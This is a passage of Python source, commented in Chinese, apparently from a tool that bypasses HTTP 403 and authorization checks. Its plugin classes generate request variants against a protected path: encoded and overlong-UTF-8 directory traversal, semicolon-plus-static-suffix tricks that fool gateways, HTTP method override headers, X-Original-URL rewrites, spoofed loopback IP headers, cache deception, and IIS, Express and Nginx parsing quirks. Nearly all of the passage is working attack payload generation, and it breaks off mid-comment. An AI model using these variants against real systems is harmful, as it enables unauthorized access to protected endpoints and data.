            V("目录穿越", "超长UTF-8 %c0%ae%c0%ae", "/x/%c0%ae%c0%ae%c0%af" + sj, c),
            V("目录穿越", "UTF-8 overlong %c0%2f", "/x/%c0%ae%c0%2f" + sj, c),
            V("目录穿越", "UTF-8 overlong %e0%80%af", "/x/%e0%80%ae%e0%80%af" + sj, c),
            V("目录穿越", "UTF-8 overlong %f0%80%80%af", "/x/%f0%80%80%ae%f0%80%80%af" + sj, c),
            # v3.1 [D4 修复] 双重编码全路径：按 UTF-8 字节编码，非 ASCII 不再产出非法序列
            V("目录穿越", "双重编码全路径", "/" + "".join(pct_encode_char(s, double=True) for s in op[1:]), c),
            # v3.3 扩充：反斜杠穿越、全角字符、双写变体、overlong 混合分隔符
            V("目录穿越", "字面反斜杠穿越 /x/..\\", "/x/..\\" + "\\".join(segs), c),
            V("目录穿越", "编码反斜杠双重穿越 %255c", "/x/%2e%2e%255c" + sj, c),
            V("目录穿越", "全角点号 ．．", "/x/．．/" + sj, c),
            V("目录穿越", "全角斜杠 ／", "/x/%2e%2e／" + sj, c),
            V("目录穿越", "双写+编码混合 ..%2f..%2f", "/x/..%2f..%2f" + sj, c),
            V("目录穿越", "overlong 混合 %c0%ae%2f", "/x/%c0%ae%c0%ae%2f" + sj, c),
            V("目录穿越", "三重编码 %25252e%25252e", "/x/%25252e%25252e" + op, c),
        ]


class StaticPrefixPlugin(VariantPlugin):
    category = "借道前缀"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        for p in STATIC_PREFIXES:
            variants.append(V("借道前缀", f"/{p}/../ 回退", f"/{p}/.." + op, c))
        for p in STATIC_PREFIXES[:3]:
            variants.append(V("借道前缀", f"/{p}/..;/ 回退", f"/{p}/..;" + op, c))
        # v3.3 扩充：更多常见静态/公开目录 + favicon/error 借道 + 编码回退
        for p in ("resources", "webjars", "error", "favicon.ico", "robots.txt", "servlet"):
            variants.append(V("借道前缀", f"/{p}/../ 回退", f"/{p}/.." + op, c))
        for p in STATIC_PREFIXES[:3]:
            variants.append(V("借道前缀", f"/{p}/%2e%2e/ 编码回退", f"/{p}/%2e%2e" + op, c))
        variants.append(V("借道前缀", "/static/..;/ 编码混合回退", "/static/..%3b" + op, c))
        return variants


class CasePlugin(VariantPlugin):
    category = "大小写"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        mixed = "".join(ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(first))
        variants = [
            V("大小写", "首段全大写", "/" + first.upper() + tail, c),
            V("大小写", "首段首字母大写", "/" + first.capitalize() + tail, c),
            V("大小写", "首段交替大小写", "/" + mixed + tail, c),
            V("大小写", "全路径大写", op.upper(), c),
        ]
        if rest:
            variants.append(V("大小写", "末段全大写", "/" + "/".join(segs[:-1]) + "/" + segs[-1].upper(), c))
        # v3.3 扩充：全路径交替大小写、末段首字母大写、单词首字母大写
        mixed_all = "".join(ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(op))
        variants.append(V("大小写", "全路径交替大小写", mixed_all, c))
        if rest:
            variants.append(V("大小写", "末段首字母大写", "/" + "/".join(segs[:-1]) + "/" + segs[-1].capitalize(), c))
        variants.append(V("大小写", "各段首字母大写", "/" + "/".join(s.capitalize() for s in segs), c))
        return variants


class SlashPlugin(VariantPlugin):
    category = "斜杠"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        return [
            V("斜杠", "尾斜杠", op + "/", c),
            V("斜杠", "尾部双斜杠", op + "//", c),
            V("斜杠", "双斜杠开头", "/" + op, c),
            V("斜杠", "三斜杠开头", "//" + op, c),
            V("斜杠", "中间双斜杠", f"/{first}//{rest}" if rest else op + "//", c),
            V("斜杠", "/./ 当前目录", f"/{first}/./" + rest if rest else "/./" + first, c),
            V("斜杠", "编码点目录 /%2e/", "/%2e/" + "/".join(segs), c),
            V("斜杠", "编码斜杠 %2f 结尾", op + "%2f", c),
            V("斜杠", "全反斜杠路径 %5c", "/" + "%5c".join(segs), c),
            # v3.3 扩充：更多重复分隔符位置、/./ 前缀、编码斜杠组合
            V("斜杠", "中段三斜杠", f"/{first}///{rest}" if rest else op + "///", c),
            V("斜杠", "四斜杠开头", "///" + op, c),
            V("斜杠", "/./ 前缀全路径", "/./" + "/".join(segs), c),
            V("斜杠", "/.// 组合前缀", "/.//" + "/".join(segs), c),
            V("斜杠", "尾部 /%2f 组合", op + "/%2f", c),
            V("斜杠", "编码双斜杠 %2f%2f 开头", "%2f%2f" + "/".join(segs), c),
            # v4.1 [P1] Pointgten.go 对齐：超长点链耗尽迭代式归一化预算
            V("斜杠", "超长点链 ×15", "/./" * 15 + "/".join(segs), c),
        ]


class SuffixPlugin(VariantPlugin):
    category = "后缀匹配"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []
        # v3.7: 直接追加全量静态后缀池（原 8 个 → 38 个）
        for suf in STATIC_SUFFIXES:
            variants.append(V("后缀匹配", f"追加 {suf}", op + suf, c))
        variants.append(V("后缀匹配", "尾部点号", op + ".", c))
        variants.append(V("后缀匹配", "尾部 /. 后缀", op + "/.", c))
        # v3.3 扩充：备份/静态/框架后缀、分号与斜杠组合伪后缀、编码点后缀
        for suf in (".txt", ".bak", ".old", ".ico", ".svg", ".wsdl", ".jsonp", ".jspx"):
            variants.append(V("后缀匹配", f"追加 {suf}", op + suf, c))
        # v3.7: 斜杠+后缀、编码点+后缀全池展开（原仅 /.json / %2ejson 两个字面值；
        #       分号形态 ;.json / ;1.js 等统一由 SemicolonSuffixPlugin(AC) 负责，避免类别语义重叠）
        for suf in SEMICOLON_SUFFIX_CORE:
            variants.append(V("后缀匹配", f"斜杠+伪后缀 /{suf}", op + "/" + suf, c))
            variants.append(V("后缀匹配", f"编码点后缀 %2e{suf.lstrip('.')}", op + "%2e" + suf.lstrip("."), c))
        variants.append(V("后缀匹配", "尾部 .. 双点号", op + "..", c))
        return variants


class SemicolonSuffixPlugin(VariantPlugin):
    """v3.7 分号×静态后缀矩阵（类别 AC）：;.js / ;1.js / ;a.js / ;x=1.js /
    .js; / .js;1 / %3b.js / %253b.js / ;jsessionid=1.js 等全形态覆盖。

    成因：网关/WAF 按 \\.(js|css|png|html)$ 等静态后缀规则直接放行，或对分号
    矩阵参数裁剪后误判资源类型；而后端容器（Tomcat/Jetty/Undertow/JBoss）在
    路由前会裁剪路径段中分号及其后内容：
      /api/admin;1.js → 网关按 .js 静态资源放行
                      → Tomcat 裁剪 ;1.js 路由到 /api/admin（受保护接口）
    原版仅 SuffixPlugin 硬编码 ;.json / /.json / %2ejson 三个字面形态；
    本插件把"分号修饰符 × 全量静态后缀池"展开成完整矩阵，并补齐：
      - 序号变体 ;0.js~;3.js（版本号/缓存穿透风格，;1.js 为代表形态）
      - 字母/矩阵参数变体 ;a.js / ;x=1.js
      - Java 会话风格 ;jsessionid=1.js
      - 反序形态 .js; / .js;1（后缀在前分号在后）
      - 编码分号 %3b.js / 双重编码 %253b.js / 编码点 ;%2ejs
      - 后缀大小写 ;.JS / ;.Js（网关精确匹配 .js$ 不命中 .JS$）
      - 双分号 ;;.js / 斜杠 /;.js / 分号包裹 ;.js;"""
    category = "分号后缀"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = []

        # ① 分号+后缀（;.js 型，用户示例一）——全量后缀池
        for suf in STATIC_SUFFIXES:
            variants.append(V(self.category, f"分号+静态后缀 ;{suf}", op + ";" + suf, c))
        # ② 分号+序号+后缀（;1.js 型，用户示例二）——全量后缀池
        for suf in STATIC_SUFFIXES:
            variants.append(V(self.category, f"分号+序号+后缀 ;1{suf}", op + ";1" + suf, c))
        # ③ 其余高价值形态——核心后缀池
        for suf in SEMICOLON_SUFFIX_CORE:
            variants.append(V(self.category, f"分号+字母+后缀 ;a{suf}", op + ";a" + suf, c))
            variants.append(V(self.category, f"分号+矩阵参数+后缀 ;x=1{suf}", op + ";x=1" + suf, c))
            variants.append(V(self.category, f"反序 后缀+分号 {suf};", op + suf + ";", c))
            variants.append(V(self.category, f"反序 后缀+分号+序号 {suf};1", op + suf + ";1", c))
        for suf in SEMICOLON_SUFFIX_CORE[:6]:
            variants.append(V(self.category, f"编码分号+后缀 %3b{suf}", op + "%3b" + suf, c))
            variants.append(V(self.category, f"双重编码分号+后缀 %253b{suf}", op + "%253b" + suf, c))
            variants.append(V(self.category, f"分号+编码点号后缀 ;%2e{suf.lstrip('.')}",
                              op + ";%2e" + suf.lstrip("."), c))
            variants.append(V(self.category, f"斜杠+分号+后缀 /;{suf}", op + "/;" + suf, c))
            variants.append(V(self.category, f"双分号+后缀 ;;{suf}", op + ";;" + suf, c))
            variants.append(V(self.category, f"会话ID+后缀 ;jsessionid=1{suf}",
                              op + ";jsessionid=1" + suf, c))
            variants.append(V(self.category, f"分号+序号+编码点号 ;1%2e{suf.lstrip('.')}",
                              op + ";1%2e" + suf.lstrip("."), c))
        # ④ 序号枚举（;0.js / ;2.js / ;3.js——版本号/缓存穿透风格）
        for n in ("0", "2", "3"):
            for suf in (".js", ".css", ".html", ".json"):
                variants.append(V(self.category, f"分号+序号枚举 ;{n}{suf}", op + ";" + n + suf, c))
        # ⑤ 后缀大小写差异（网关精确匹配 .js$ 不命中 .JS$ / .Js$）
        for suf in (".js", ".css", ".png", ".html", ".json"):
            variants.append(V(self.category, f"分号+后缀大写 ;{suf.upper()}", op + ";" + suf.upper(), c))
            variants.append(V(self.category, f"分号+后缀首字母大写 ;{suf.capitalize()}",
                              op + ";" + suf.capitalize(), c))
            variants.append(V(self.category, f"分号+序号+后缀大写 ;1{suf.upper()}",
                              op + ";1" + suf.upper(), c))
        # ⑥ 分号包裹与组合收尾形态
        for suf in (".js", ".css", ".html"):
            variants.append(V(self.category, f"分号包裹 ;{suf};", op + ";" + suf + ";", c))
            variants.append(V(self.category, f"分号序号包裹 ;1{suf};1", op + ";1" + suf + ";1", c))
        return variants


class SpecialEncodingPlugin(VariantPlugin):
    category = "特殊编码"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail, segs = c["orig_path"], c["first"], c["rest"], c["tail_rest"], c["segs"]
        V = self._build
        variants = []
        if first:
            # v3.1 [D4 修复] 首字母编码改按 UTF-8 字节，支持非 ASCII 路径
            enc = pct_encode_char(first[0]) + first[1:]
            variants.append(V("特殊编码", "首字母 URL 编码", "/" + enc + tail, c))
            dbl = pct_encode_char(first[0], double=True) + first[1:]
            variants.append(V("特殊编码", "首字母双重编码", "/" + dbl + tail, c))
            variants.append(V("特殊编码", "首段前导 %09 制表符", "/%09" + "/".join(segs), c))
            # v4.1 [P2] KG.go 对齐：%20 空格段前导
            variants.append(V("特殊编码", "首段前导 %20 空格段", "/%20/" + "/".join(segs), c))
        variants.append(V("特殊编码", "路径尾部 %00 截断尝试", op + "%00", c))
        if rest:
            variants.append(V("特殊编码", "路径中间 %00", f"/{first}%00" + tail, c))
            variants.append(V("特殊编码", "路径中间 %3f 编码问号", f"/{first}%3f" + tail, c))
        variants.append(V("特殊编码", "路径尾部 %20 空格", op + "%20", c))
        variants.append(V("特殊编码", "路径尾部 %09 制表符", op + "%09", c))
        variants.append(V("特殊编码", "首个 / 替换为 %5c", "/" + op[1:].replace("/", "%5c", 1), c))
        variants.append(V("特殊编码", "路径尾部 %0a 换行", op + "%0a", c))
        variants.append(V("特殊编码", "路径尾部 %0d 回车", op + "%0d", c))
        variants.append(V("特殊编码", "路径尾部 %0d%0a 组合", op + "%0d%0a", c))
        variants.append(V("特殊编码", "尾部 %23 编码井号", op + "%23", c))
        variants.append(V("特殊编码", "原始反斜杠路径", "/" + "\\".join(segs), c))
        # v3.3 扩充：更多控制字符、中段空白、全角/截断组合
        variants.append(V("特殊编码", "路径尾部 %0b 垂直制表符", op + "%0b", c))
        variants.append(V("特殊编码", "路径尾部 %0c 换页符", op + "%0c", c))
        variants.append(V("特殊编码", "路径中段 %20 空格", f"/{first}%20" + tail if rest else op + "/%20", c))
        variants.append(V("特殊编码", "路径中段 %09 制表符", f"/{first}%09" + tail if rest else op + "%09", c))
        variants.append(V("特殊编码", "全角斜杠分隔 ／", "/" + "／".join(segs), c))
        variants.append(V("特殊编码", "尾部 %3b%00 分号截断组合", op + "%3b%00", c))
        variants.append(V("特殊编码", "尾部 %00.json 截断+伪后缀", op + "%00.json", c))
        # ------------------------------------------------------------------
        # v4.4 [P13] 边界补齐（9 条）：前导编码斜杠族 / 双编点+分号前缀。
        # 原理：双重编码 %25xx 在代理解码一层后仍为 %xx 字面，应用再解一层
        # 才得语义字符——两层解码轮次差是 ACL 失配的根本来源。
        # （尾部 %3f 编码问号归 FragmentBoundaryPlugin，尾部 %23 既有，均不重复）
        # ------------------------------------------------------------------
        variants.append(V("特殊编码", "前导 %2f 编码斜杠", "/%2f" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "前导 %2f// 编码斜杠+双斜杠", "/%2f//" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "前导 %252f 双重编码斜杠", "/%252f" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "前导 %252f/ 双编+字面斜杠", "/%252f/" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "前导 %252f%252f 双重编码双斜杠", "/%252f%252f" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "前导 %2e%2f 编码点+编码斜杠", "/%2e%2f" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "/%252e%253b/ 双编点分号前缀", "/%252e%253b/" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "/%252e%252e%253b/ 双编双点分号前缀", "/%252e%252e%253b/" + op.lstrip("/"), c))
        variants.append(V("特殊编码", "/%252e%252f/ 双编点+编码斜杠", "/%252e%252f/" + op.lstrip("/"), c))
        return variants


class HttpMethodPlugin(VariantPlugin):
    """I 类：HTTP 方法级鉴权绕过（v3.8 重构——感知基础方法与请求体）。

    利用面：网关 location / SecurityConfig 按 (路径, 方法) 二元组配置规则，
    常见漏配是只收紧了部分方法；或方法覆盖头被网关尊重、后端框架按覆盖值二次路由。
    v3.8 优化：
      [1] 方法交换矩阵相对基础方法生成（-r POST 时自动补 GET/PUT/PATCH 等动词），
          交换变形继承基础请求体与请求头；
      [2] 覆盖头全家族 × 双向覆盖：方向一「载体≠基础方法、覆盖值=基础方法」
          （网关按载体放行，后端按覆盖值还原真实方法，v3.7 经典方向的一般化）、
          方向二「覆盖到 GET / 写动词」（GET 基础时保留 v3.7 经典组合）；
      [3] 参数级覆盖感知请求体类型：form 体追加 &_method= / JSON 体注入 _method
          字段 / 空体用经典 _method=xx / 任意体加 ?_method= 查询串
          （Rails、Spring HiddenHttpMethodFilter 语义）；
      [4] 基础方法小写混淆（部分容器方法匹配大小写不敏感）。"""
    category = "HTTP方法"

    # v3.8: 覆盖头全家族（v3.7 的 5 个 + X-HTTP-Override）
    OVERRIDE_HEADERS = ("X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method",
                        "HTTP-Method-Override", "X-Original-Method", "X-HTTP-Override")

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        base = (c.get("method") or "GET").upper()
        body = c.get("body") or ""
        ct = (c.get("base_headers") or {}).get("Content-Type", "")
        V = self._build
        variants = []

        # [1] 方法交换矩阵：基础方法之外的常用动词（v3.8 继承基础请求体/请求头）
        for m in ("POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"):
            if m != base:
                variants.append(V("HTTP方法", f"改用 {m}", op, c, method=m))
        variants.append(V("HTTP方法", "自定义方法 FOO", op, c, method="FOO"))
        variants.append(V("HTTP方法", f"小写 {base.lower()} 方法", op, c, method=base.lower()))

        # [2] 方向一：载体≠基础方法、覆盖值=基础方法——载体骗过网关，后端还原真实方法
        carriers = [m for m in ("POST", "GET") if m != base]
        for hdr in self.OVERRIDE_HEADERS:
            for car in carriers:
                variants.append(V("HTTP方法", f"{car} + {hdr}: {base}", op, c,
                                  method=car, headers={hdr: base}))
        # [2] 方向二：覆盖到 GET / 写动词（GET 基础时与 v3.7 经典组合完全对齐）
        if base == "GET":
            for hdr in ("X-HTTP-Method-Override", "X-Original-Method"):
                for car in ("POST", "GET"):
                    for t in ("PUT", "DELETE"):
                        variants.append(V("HTTP方法", f"{car} + {hdr}: {t}", op, c,
                                          method=car, headers={hdr: t}))
        else:
            for hdr in self.OVERRIDE_HEADERS[:3]:
                variants.append(V("HTTP方法", f"{base} + {hdr}: GET", op, c,
                                  headers={hdr: "GET"}))

        # [3] 参数级覆盖——按请求体类型注入 _method
        form_ct = "application/x-www-form-urlencoded"
        if body and "urlencoded" in ct.lower():
            for t in ("GET", "PUT", "DELETE", "PATCH"):
                variants.append(V("HTTP方法", f"POST + 基体追加 _method={t}", op, c,
                                  method="POST", headers={"Content-Type": form_ct},
                                  body=f"{body}&_method={t}"))
        elif body and ("json" in ct.lower() or body.lstrip()[:1] in ("{", "[")):
            try:
                obj = json.loads(body)
            except ValueError:
                obj = None
            if isinstance(obj, dict):
                for t in ("GET", "PUT", "DELETE", "PATCH"):
                    obj2 = dict(obj)
                    obj2["_method"] = t
                    variants.append(V("HTTP方法", f"POST + JSON 注入 _method={t}", op, c,
                                      method="POST",
                                      headers={"Content-Type": "application/json"},
                                      body=json.dumps(obj2, ensure_ascii=False)))
        elif not body:
            for t in ("GET", "DELETE", "PUT", "PATCH"):
                variants.append(V("HTTP方法", f"POST + body _method={t}", op, c,
                                  method="POST", headers={"Content-Type": form_ct},
                                  body=f"_method={t}"))
        # 查询串级覆盖（不依赖体类型，覆盖网关/框架从 query 读 _method 的面）
        qp = ("?" + c["query"] + "&") if c["query"] else "?"
        for t in ("GET", "PUT", "DELETE"):
            variants.append(V("HTTP方法", f"POST + ?_method={t}",
                              op + qp + f"_method={t}", c, method="POST", keep_query=False))

        # WebDAV / 冷门方法面（v3.3 保留）
        variants.append(V("HTTP方法", "PROPFIND (WebDAV)", op, c, method="PROPFIND"))
        variants.append(V("HTTP方法", "CONNECT 方法", op, c, method="CONNECT"))
        for m in ("MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"):
            variants.append(V("HTTP方法", f"{m} (WebDAV)", op, c, method=m))
        return variants


class ForwardHeaderPlugin(VariantPlugin):
    category = "转发头"

    def generate(self, ctx):
        c = ctx
        op, qo = c["orig_path"], c["qo"]
        V = self._build
        return [
            V("转发头", "X-Original-URL", "/", c, headers={"X-Original-URL": op + qo}, keep_query=False),
            V("转发头", "X-Rewrite-URL", "/", c, headers={"X-Rewrite-URL": op + qo}, keep_query=False),
            V("转发头", "X-Forwarded-Uri", "/", c, headers={"X-Forwarded-Uri": op + qo}, keep_query=False),
            V("转发头", "X-Original-URI", "/", c, headers={"X-Original-URI": op + qo}, keep_query=False),
            V("转发头", "X-Original-URL 双层变形", "/", c,
              headers={"X-Original-URL": op + ";jsessionid=AAAA" + qo}, keep_query=False),
            V("转发头", "X-Forwarded-Prefix", op, c, headers={"X-Forwarded-Prefix": "/internal"}),
            V("转发头", "X-Forwarded-Host: localhost", op, c, headers={"X-Forwarded-Host": "localhost"}),
            V("转发头", "X-Forwarded-Proto: https", op, c, headers={"X-Forwarded-Proto": "https"}),
            # v3.3 扩充：Host 类改写头、编码路径值、穿越值、双写路径
            V("转发头", "X-Host: localhost", op, c, headers={"X-Host": "localhost"}),
            V("转发头", "X-Forwarded-Server: localhost", op, c, headers={"X-Forwarded-Server": "localhost"}),
            V("转发头", "X-HTTP-Host-Override: localhost", op, c, headers={"X-HTTP-Host-Override": "localhost"}),
            V("转发头", "X-Forwarded-Scheme: https", op, c, headers={"X-Forwarded-Scheme": "https"}),
            V("转发头", "X-Rewrite-URL 编码路径值", "/", c,
              headers={"X-Rewrite-URL": pct_encode(op[1:]) + qo}, keep_query=False),
            V("转发头", "X-Original-URL 穿越值(../;/)", "/", c,
              headers={"X-Original-URL": "/x/..;/" + op.lstrip("/") + qo}, keep_query=False),
            V("转发头", "X-Original-URL 首段双写", "/", c,
              headers={"X-Original-URL": f"/{c['first']}/{c['first']}" + c["tail_rest"] + qo}, keep_query=False),
        ]


class SourceSpoofPlugin(VariantPlugin):
    category = "来源伪造"

    def generate(self, ctx):
        c = ctx
        op, prefix = c["orig_path"], c["prefix"]
        V = self._build
        variants = []
        for h in IP_SPOOF_HEADERS:
            variants.append(V("来源伪造", f"{h}: 127.0.0.1", op, c, headers={h: "127.0.0.1"}))
        variants.append(V("来源伪造", "X-Forwarded-For 内网地址", op, c, headers={"X-Forwarded-For": "10.0.0.1"}))
        variants.append(V("来源伪造", "Referer 伪造站内来源", op, c, headers={"Referer": prefix + op}))
        # v3.3 扩充：更多内网/回环/链路本地地址、CDN 真实 IP 头、XFF 链、IPv6 回环
        for ip in ("192.168.1.1", "172.16.0.1", "169.254.1.1", "0.0.0.0", "localhost", "::1"):
            variants.append(V("来源伪造", f"X-Forwarded-For: {ip}", op, c, headers={"X-Forwarded-For": ip}))
        variants.append(V("来源伪造", "X-Forwarded-For 代理链", op, c,
                          headers={"X-Forwarded-For": "127.0.0.1, 10.0.0.1"}))
        for h in ("X-Originating-IP", "True-Client-IP", "CF-Connecting-IP",
                  "X-Custom-IP-Authorization", "Fastly-Client-IP", "X-Cluster-Client-IP"):
            variants.append(V("来源伪造", f"{h}: 127.0.0.1", op, c, headers={h: "127.0.0.1"}))
        variants.append(V("来源伪造", "Referer 站点根路径", op, c, headers={"Referer": prefix + "/"}))
        # v4.3 [P0-2] 《403 Forbidden 绕过技术》信任头字典补齐：21 个缺口头
        #（URL/地址类 + 拼写错误变体）+ X-Forwarded-Port 五值 + X-Forwarded-Scheme
        # http 降级方向——覆盖非标中间件/老网关按这些头做 IP 信任判断的场景
        for h in ARTICLE_TRUST_HEADERS:
            variants.append(V(self.category, f"{h}: 127.0.0.1", op, c, headers={h: "127.0.0.1"}))
        for port in ARTICLE_XFP_PORTS:
            variants.append(V(self.category, f"X-Forwarded-Port: {port}", op, c,
                              headers={"X-Forwarded-Port": port}))
        variants.append(V(self.category, "X-Forwarded-Scheme: http(降级方向)", op, c,
                          headers={"X-Forwarded-Scheme": "http"}))
        return variants


class PathStructurePlugin(VariantPlugin):
    category = "路径结构"

    def generate(self, ctx):
        c = ctx
        op, first, rest, segs = c["orig_path"], c["first"], c["rest"], c["segs"]
        V = self._build
        variants = []
        if rest:
            variants.append(V("路径结构", "访问父路径（/** 规则不覆盖本级）", "/" + "/".join(segs[:-1]), c))
            variants.append(V("路径结构", "首段重复双写", f"/{first}/{first}/" + rest, c))
        # v3.3 扩充：祖父路径、末段双写、追加默认资源段
        if len(segs) > 2:
            variants.append(V("路径结构", "访问祖父路径", "/" + "/".join(segs[:-2]), c))
        if rest:
            variants.append(V("路径结构", "末段重复双写", op + "/" + segs[-1], c))
        for sub in ("index", "list", "default"):
            variants.append(V("路径结构", f"追加默认段 /{sub}", op + f"/{sub}", c))
        return variants


class CacheDeceptionPlugin(VariantPlugin):
    category = "缓存欺骗"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = [
            V("缓存欺骗", "追加伪静态资源 /x.css", op + "/x.css", c),
            V("缓存欺骗", "尾部 %0a.css", op + "%0a.css", c),
            # v3.3 扩充：更多可缓存后缀、分号/编码字符诱导缓存键差异
            *[V("缓存欺骗", f"追加伪静态 /x{suf}", op + f"/x{suf}", c)
              for suf in (".js", ".png", ".svg", ".ico", ".woff2", ".jpg")],
            V("缓存欺骗", "分号+伪静态 ;x.css", op + ";x.css", c),
            V("缓存欺骗", "编码问号伪静态 %3f.css", op + "%3f.css", c),
            V("缓存欺骗", "编码井号伪静态 %23.png", op + "%23.png", c),
            V("缓存欺骗", "尾部 %0a.js", op + "%0a.js", c),
        ]
        # v3.7 扩充：可缓存后缀池全量展开（字体/位图/地图/sourceMap 等均常被 CDN 规则命中）
        for suf in (".jpeg", ".gif", ".webp", ".bmp", ".ttf", ".woff", ".eot", ".otf",
                    ".map", ".mjs", ".html", ".htm", ".xml", ".txt", ".mp4", ".swf"):
            variants.append(V("缓存欺骗", f"追加伪静态 /x{suf}", op + f"/x{suf}", c))
        # v3.7 扩充：分号+字母+可缓存后缀（CDN 按后缀建缓存键，后端裁剪分号还原原路径）
        for suf in (".js", ".css", ".png", ".html", ".json"):
            variants.append(V("缓存欺骗", f"分号+伪静态 ;x{suf}", op + ";x" + suf, c))
        # v3.7 扩充：序号风格缓存穿透（;v=2.js 版本参数风格）
        for suf in (".js", ".css"):
            variants.append(V("缓存欺骗", f"序号伪静态 ;v=2{suf}", op + ";v=2" + suf, c))
        return variants


class DotNetPlugin(VariantPlugin):
    """IIS / .NET 路径解析差异变形"""
    category = "DotNet"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        V = self._build
        return [
            V("DotNet", "%5c 全反斜杠路径", "/" + "%5c".join(segs), c),
            V("DotNet", "/~/ 波浪号前缀(IIS短文件名)", "/~" + op, c),
            V("DotNet", "::$DATA NTFS数据流", op + "::$DATA", c),
            V("DotNet", "尾部 /.$DATA", op + "/.$DATA", c),
            # v3.3 扩充：Cookieless 会话、%u 编码穿越、更多 NTFS/Windows 解析特性
            V("DotNet", "ASP.NET Cookieless 会话 /(S(x))/", "/(S(" + "A" * 24 + "))" + op, c),
            V("DotNet", "%u002e%u002e Unicode 穿越", "/x/%u002e%u002e%u002f" + "/".join(segs), c),
            V("DotNet", "::$INDEX_ALLOCATION 索引流", op + "::$INDEX_ALLOCATION", c),
            V("DotNet", "备用数据流 :$DATA", op + ":$DATA", c),
            V("DotNet", "尾部点+空格 (Windows)", op + ".%20", c),
            V("DotNet", "波浪号短文件名尾缀 ~1", op + "~1", c),
        ]


class NodeJsPlugin(VariantPlugin):
    """Node.js (Express) 路由差异变形"""
    category = "NodeJs"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        V = self._build
        variants = [
            V("NodeJs", "大写+尾斜杠", op.upper() + "/", c),
            # v3.1 [D4 修复] 全路径URL编码改按 UTF-8 字节
            V("NodeJs", "全路径URL编码", "/" + "".join(pct_encode_char(ch) for ch in op[1:]), c),
        ]
        if c["query"]:
            variants.append(V("NodeJs", "HTTP参数污染 ?id=1&id=2", op + "?" + c["query"] + "&id=2", c))
        else:
            variants.append(V("NodeJs", "HTTP参数污染 ?id=1&id=2", op + "?id=1&id=2", c))
        # v3.3 扩充：数组参数污染、Express 分号忽略、通配与矩阵参数差异
        variants.append(V("NodeJs", "数组参数污染 ?id[]=1&id[]=2", op + "?id[]=1&id[]=2", c))
        variants.append(V("NodeJs", "Express 分号忽略 ;x=1", op + ";x=1", c))
        variants.append(V("NodeJs", "尾段通配符 *", op + "*", c))
        variants.append(V("NodeJs", "尾段正则通配 (.*)", op + "(.*)", c))
        return variants


class NginxPlugin(VariantPlugin):
    """Nginx 配置差异变形"""
    category = "Nginx"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        sj = "/".join(c["segs"])
        V = self._build
        return [
            V("Nginx", "%00.jpg 截断+alias", op + "%00.jpg", c),
            V("Nginx", "/proxy_pass 前缀", "/proxy" + op, c),
            V("Nginx", "// 双斜杠前缀(proxy_pass差异)", "//" + op.lstrip("/"), c),
            # v3.3 扩充：alias 拼接穿越、merge_slashes 差异、编码斜杠前缀
            V("Nginx", "alias 拼接穿越 /static..%2f..%2f", "/" + STATIC_PREFIXES[0] + "..%2f..%2f" + sj, c),
            V("Nginx", "merge_slashes 差异 ////", "///" + op, c),
            V("Nginx", "编码斜杠前缀 %2f", "%2f" + op.lstrip("/"), c),
            V("Nginx", "..%2f alias 回退", "/x..%2f..%2f" + sj, c),
        ]


class PathNormalizationPlugin(VariantPlugin):
    """v3.2 [需求1] 路径规范化差异：发现服务器/代理/框架/鉴权模块
    对路径标准化顺序不一致（security rule 看的 URI 与 actual routing 解析结果不同）"""
    category = "路径规范化"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        segs = c["segs"]
        V = self._build
        return [
            V("路径规范化", "重复分隔符 首段后双斜杠", f"/{first}//{rest}" if rest else "//" + first, c),
            V("路径规范化", "重复分隔符 三斜杠开头", "///" + "/".join(segs), c),
            V("路径规范化", "尾部斜杠差异", op + "/", c),
            V("路径规范化", "点段归一化 中段 /./", f"/{first}/./{rest}" if rest else "/./" + first, c),
            V("路径规范化", "点段归一化 自消解 /a/../a/",
              f"/{first}/../{first}/{rest}" if rest else f"/{first}/../{first}", c),
            V("路径规范化", "点段归一化 尾部 /.", op + "/.", c),
            V("路径规范化", "点段归一化 尾部 /..", op + "/..", c),
            V("路径规范化", "混合分隔符 首段后 %5c", f"/{first}%5c{rest}" if rest else "/" + first, c),
            V("路径规范化", "混合分隔符 编码斜杠 %2f 作分隔", "/" + "%2f".join(segs), c),
            V("路径规范化", "空路径段 前导 //", "//" + "/".join(segs), c),
            V("路径规范化", "空路径段 尾部空段 //", op + "//", c),
            # v3.3 扩充：连续点段、自消解变体、编码点段、尾部长点段
            V("路径规范化", "连续点段 /././", "/././" + "/".join(segs), c),
            V("路径规范化", "自消解 x/../ 变体",
              f"/{first}/x/../{rest}" if rest else f"/{first}/x/../{first}", c),
            V("路径规范化", "编码点段 /%2e/%2e/", "/%2e/%2e/" + "/".join(segs), c),
            V("路径规范化", "尾部 /./. 组合", op + "/./.", c),
            V("路径规范化", "尾部 /.. 编码 %2e%2e", op + "/%2e%2e", c),
            V("路径规范化", "空段+点段混合 //./", "//./" + "/".join(segs), c),
            # v4.1 [P1] MidPaths.go 对齐：null 字节×穿越的段间组合——
